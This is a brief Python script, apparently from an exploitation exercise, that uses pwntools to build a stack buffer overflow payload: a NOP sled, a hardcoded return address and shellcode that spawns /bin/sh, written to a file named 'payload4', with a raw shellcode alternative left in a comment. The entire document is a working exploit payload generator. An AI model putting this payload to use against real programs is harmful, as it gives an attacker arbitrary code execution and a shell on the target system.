#!/usr/bin/env python
from struct import *
from pwn import *

context.arch='amd64'
context.os='linux'
shellcode = asm(shellcraft.sh())
#shellcode = ("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c"
#            "\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52"
#            "\x57\x54\x5e\xb0\x3b\x0f\x05")

addr = struct.pack("<Q", 0x7fffffffe1d0)
payload = ''
payload += '\x90'*22
payload += addr
payload += '\x90'*8
payload += shellcode
f = open("payload4", "w")
f.write(payload)
